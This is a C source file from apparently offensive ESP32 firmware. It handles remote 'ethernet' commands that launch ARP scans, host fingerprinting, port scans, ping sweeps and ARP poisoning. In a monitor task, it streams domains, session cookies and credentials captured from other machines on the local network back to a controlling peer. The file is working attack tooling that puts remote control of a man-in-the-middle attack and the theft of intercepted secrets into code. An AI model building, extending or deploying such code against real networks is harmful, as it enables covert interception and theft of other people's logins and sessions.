#include "sdkconfig.h"

#ifdef CONFIG_WITH_ETHERNET

#include "managers/ethernet/eth_comm_handler.h"
#include "core/esp_comm_manager.h"
#include "managers/ethernet/eth_scan_async.h"
#include "managers/ethernet/eth_fingerprint.h"
#include "attacks/ethernet/eth_arp_poison.h"
#include "managers/ethernet_manager.h"
#include "core/glog.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_netif.h"
#include "esp_log.h"
#include <string.h>
#include <stdio.h>
#include <stdarg.h>

static const char *TAG = "EthCommHandler";

// Forward-declare internal esp-netif function (same pattern as eth_arp_poison.c)
void *esp_netif_get_netif_impl(esp_netif_t *esp_netif);

static volatile bool s_remote_task_running = false;
static TaskHandle_t  s_remote_task         = NULL;

// -----------------------------------------------------------------------
// Helper: stream a single null-terminated text record to the peer.
// Format: "<type>|<field1>|<field2>...\0"
// -----------------------------------------------------------------------
static void eth_stream_record(const char *fmt, ...) {
    char buf[192];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    // Include null terminator so peer knows record boundary
    esp_comm_manager_send_stream(COMM_STREAM_CHANNEL_ETHERNET,
                                 (const uint8_t *)buf,
                                 strlen(buf) + 1);
}

// -----------------------------------------------------------------------
// Stream current interface status to peer.
// Record: "I|<ip>|<mask>|<gw>|<mac>|<speed_mbps>"
// -----------------------------------------------------------------------
static void eth_stream_interface_info(void) {
    if (!ethernet_manager_is_connected()) {
        eth_stream_record("I|0.0.0.0|0.0.0.0|0.0.0.0|00:00:00:00:00:00|0");
        return;
    }
    esp_netif_ip_info_t ip_info;
    char ip[16] = "--", mask[16] = "--", gw[16] = "--", mac_str[20] = "--";
    int speed = 0;
    if (ethernet_manager_get_ip_info(&ip_info) == ESP_OK) {
        esp_ip4addr_ntoa(&ip_info.ip,      ip,   sizeof(ip));
        esp_ip4addr_ntoa(&ip_info.netmask, mask, sizeof(mask));
        esp_ip4addr_ntoa(&ip_info.gw,      gw,   sizeof(gw));
    }
    ethernet_link_info_t link;
    if (ethernet_manager_get_link_info(&link) == ESP_OK) speed = link.speed_mbps;
    esp_netif_t *netif = ethernet_manager_get_netif();
    if (netif) {
        uint8_t m[6];
        if (esp_netif_get_mac(netif, m) == ESP_OK)
            snprintf(mac_str, sizeof(mac_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                     m[0], m[1], m[2], m[3], m[4], m[5]);
    }
    eth_stream_record("I|%s|%s|%s|%s|%d", ip, mask, gw, mac_str, speed);
}

// -----------------------------------------------------------------------
// Remote ARP scan task
// -----------------------------------------------------------------------
static void remote_arp_task(void *arg) {
    s_remote_task_running = true;
    eth_stream_record("S|scanning");
    eth_stream_interface_info();

    eth_scan_start_arp();
    // Poll until done
    while (eth_scan_is_running() && s_remote_task_running) {
        const eth_scan_results_t *r = eth_scan_get_results();
        eth_stream_record("G|%d|%d", r->progress_current, r->progress_total);
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    // Stream results
    const eth_scan_results_t *r = eth_scan_get_results();
    for (int i = 0; i < r->arp_count && i < 64; i++) {
        eth_stream_record("H|%s|%02X:%02X:%02X:%02X:%02X:%02X|%s",
            r->arp_hosts[i].ip_str,
            r->arp_hosts[i].mac[0], r->arp_hosts[i].mac[1],
            r->arp_hosts[i].mac[2], r->arp_hosts[i].mac[3],
            r->arp_hosts[i].mac[4], r->arp_hosts[i].mac[5],
            r->arp_hosts[i].hostname);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    eth_stream_record("S|done");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDelete(NULL);
}

// -----------------------------------------------------------------------
// Remote fingerprint scan task
// -----------------------------------------------------------------------
static void remote_fp_task(void *arg) {
    s_remote_task_running = true;
    eth_stream_record("S|scanning");

    eth_fingerprint_start_async();
    while (eth_fingerprint_scan_is_running() && s_remote_task_running) {
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    if (!s_remote_task_running) {
        eth_stream_record("S|done");
        s_remote_task = NULL;
        vTaskDelete(NULL);
        return;
    }

    const eth_fp_results_t *results = eth_fingerprint_get_last_results();
    int count = results ? results->count : 0;
    for (int i = 0; i < count && i < 32; i++) {
        eth_fp_host_t *h = &results->hosts[i];
        eth_stream_record("F|%s|%s|%s|%s|%s|%s",
            h->ip_str, h->name, h->device_type,
            h->protocol, h->service_type, h->os_info);
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    eth_stream_record("S|done");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDelete(NULL);
}

// -----------------------------------------------------------------------
// Remote port scan task (bool arg: true = all ports)
// -----------------------------------------------------------------------
static void remote_port_task(void *arg) {
    bool scan_all = (bool)(intptr_t)arg;
    s_remote_task_running = true;
    eth_stream_record("S|scanning");

    // Determine target IP (gateway by default)
    char target_ip[16] = "";
    esp_netif_ip_info_t ip_info;
    if (ethernet_manager_get_ip_info(&ip_info) == ESP_OK && ip_info.gw.addr != 0)
        esp_ip4addr_ntoa(&ip_info.gw, target_ip, sizeof(target_ip));

    eth_scan_start_port(target_ip[0] ? target_ip : NULL, scan_all);
    while (eth_scan_is_running() && s_remote_task_running) {
        const eth_scan_results_t *r = eth_scan_get_results();
        eth_stream_record("G|%d|%d", r->progress_current, r->progress_total);
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    const eth_scan_results_t *r = eth_scan_get_results();
    eth_stream_record("T|%s", r->target_ip);  // target IP for display
    for (int i = 0; i < r->port_count && i < 256; i++) {
        eth_stream_record("P|%d|%s", r->port_results[i].port, r->port_results[i].service);
        vTaskDelay(pdMS_TO_TICKS(5));
    }
    eth_stream_record("S|done");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDelete(NULL);
}

// -----------------------------------------------------------------------
// Remote ping sweep task
// -----------------------------------------------------------------------
static void remote_ping_task(void *arg) {
    s_remote_task_running = true;
    eth_stream_record("S|scanning");
    eth_scan_start_ping();
    while (eth_scan_is_running() && s_remote_task_running) {
        const eth_scan_results_t *r = eth_scan_get_results();
        eth_stream_record("G|%d|%d", r->progress_current, r->progress_total);
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    const eth_scan_results_t *r = eth_scan_get_results();
    eth_stream_record("N|%d|%d", r->ping_alive, r->ping_total);
    eth_stream_record("S|done");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDelete(NULL);
}

// -----------------------------------------------------------------------
// Remote ARP poison monitor task
// -----------------------------------------------------------------------
static void remote_poison_monitor_task(void *arg) {
    s_remote_task_running = true;
    eth_stream_record("S|running");
    int prev_counts[3] = {0};
    while (eth_arp_poison_is_running() && s_remote_task_running) {
        eth_arp_poison_snapshot_t snap;
        if (eth_arp_poison_get_snapshot(&snap)) {
            int counts[3] = { snap.domain_count, snap.cookie_count, snap.cred_count };
            // Stream new domains  (domains[50][64])
            for (int i = prev_counts[0]; i < counts[0] && i < 50; i++)
                eth_stream_record("D|%s", snap.domains[i]);
            // Stream new cookies  (cookies[10][48])
            for (int i = prev_counts[1]; i < counts[1] && i < 10; i++)
                eth_stream_record("K|%s", snap.cookies[i]);
            // Stream new creds    (creds[10][64])
            for (int i = prev_counts[2]; i < counts[2] && i < 10; i++)
                eth_stream_record("C|%s", snap.creds[i]);
            // Stream summary counts (always)
            eth_stream_record("M|%d|%d|%d|%d",
                snap.host_count, snap.domain_count,
                snap.cookie_count, snap.cred_count);
            for (int i = 0; i < 3; i++) prev_counts[i] = counts[i];
        }
        vTaskDelay(pdMS_TO_TICKS(1000));
    }
    eth_stream_record("S|stopped");
    s_remote_task_running = false;
    s_remote_task = NULL;
    vTaskDelete(NULL);
}

// -----------------------------------------------------------------------
// Handle a remote "ethernet" command routed from the main GhostLink
// command dispatcher.
// -----------------------------------------------------------------------
bool eth_comm_handler_handle_command(const char *command, const char *data) {
    if (!command || strcmp(command, "ethernet") != 0) return false;
    if (!data) return true;

    ESP_LOGI(TAG, "Received ethernet command: %s", data);

    // Cancel any running remote task first
    if (s_remote_task_running) {
        s_remote_task_running = false;
        eth_scan_cancel();
        eth_fingerprint_scan_cancel();
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    if (strcmp(data, "arp_scan") == 0) {
        xTaskCreate(remote_arp_task,    "eth_rem_arp",  8192, NULL, 5, &s_remote_task);
    } else if (strcmp(data, "fp_scan") == 0) {
        xTaskCreate(remote_fp_task,     "eth_rem_fp",   10240, NULL, 5, &s_remote_task);
    } else if (strcmp(data, "port_scan_local") == 0) {
        xTaskCreate(remote_port_task,   "eth_rem_port", 8192, (void *)(intptr_t)false, 5, &s_remote_task);
    } else if (strcmp(data, "port_scan_all") == 0) {
        xTaskCreate(remote_port_task,   "eth_rem_port", 8192, (void *)(intptr_t)true,  5, &s_remote_task);
    } else if (strcmp(data, "ping_sweep") == 0) {
        xTaskCreate(remote_ping_task,   "eth_rem_ping", 8192, NULL, 5, &s_remote_task);
    } else if (strcmp(data, "poison_start") == 0) {
        eth_arp_poison_start();
        xTaskCreate(remote_poison_monitor_task, "eth_rem_mon", 8192, NULL, 3, &s_remote_task);
    } else if (strcmp(data, "poison_stop") == 0) {
        eth_arp_poison_stop();
    } else if (strcmp(data, "status") == 0) {
        eth_stream_interface_info();
        eth_stream_record("S|%s", eth_arp_poison_is_running() ? "poison_running" : "idle");
    } else if (strcmp(data, "cancel") == 0) {
        // already cancelled above; acknowledge
        eth_stream_record("S|done");
    }

    return true;
}

// -----------------------------------------------------------------------
// Public API
// -----------------------------------------------------------------------
void eth_comm_handler_init(void) {
    ESP_LOGI(TAG, "Ethernet GhostLink handler ready");
}

void eth_comm_handler_deinit(void) {
    s_remote_task_running = false;
    eth_scan_cancel();
    eth_fingerprint_scan_cancel();
}

#endif // CONFIG_WITH_ETHERNET
